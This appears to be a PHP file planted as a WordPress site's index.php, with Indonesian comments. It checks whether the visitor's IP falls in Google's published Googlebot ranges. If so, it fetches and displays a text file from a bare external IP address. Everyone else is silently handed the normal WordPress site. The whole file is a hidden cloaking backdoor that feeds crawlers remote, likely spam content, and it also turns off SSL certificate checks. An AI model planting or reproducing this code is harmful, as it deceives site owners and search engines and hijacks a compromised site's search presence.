<?php

// Fungsi untuk memeriksa apakah IP berada dalam rentang tertentu
function ipInRange($ip, $range) {
    if (strpos($range, '/') == false) {
        $range .= '/32';
    }
    list($range, $netmask) = explode('/', $range, 2);
    $rangeDecimal = ip2long($range);
    $ipDecimal = ip2long($ip);
    $wildcardDecimal = pow(2, (32 - $netmask)) - 1;
    $netmaskDecimal = ~$wildcardDecimal;
    return (($ipDecimal & $netmaskDecimal) == ($rangeDecimal & $netmaskDecimal));
}

// Ambil alamat IP pengunjung
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Inisialisasi cURL
$ch = curl_init();

// Set URL dan opsi cURL
curl_setopt($ch, CURLOPT_URL, 'https://developers.google.com/search/apis/ipranges/googlebot.json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Mengabaikan verifikasi SSL

// Eksekusi cURL dan ambil hasilnya
$googlebot_ips = curl_exec($ch);

// Cek jika ada kesalahan
if ($googlebot_ips === false) {
    die('cURL Error: ' . curl_error($ch));
}

// Tutup sesi cURL
curl_close($ch);

// Decode data JSON rentang IP Googlebot
$ip_ranges = json_decode($googlebot_ips, true);

// Cek apakah alamat IP pengunjung ada di rentang Googlebot
$is_googlebot = false;
foreach ($ip_ranges['prefixes'] as $range) {
    if (ipInRange($visitor_ip, $range['ipv4Prefix'])) {
        $is_googlebot = true;
        break;
    }
}

// Lakukan sesuatu jika terdeteksi Googlebot
if ($is_googlebot) {
    $file_content = file_get_contents('http://174.138.76.21/reff/unsoed.txt');
    
    // Tampilkan konten file
    echo $file_content;
} else {
    define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
}
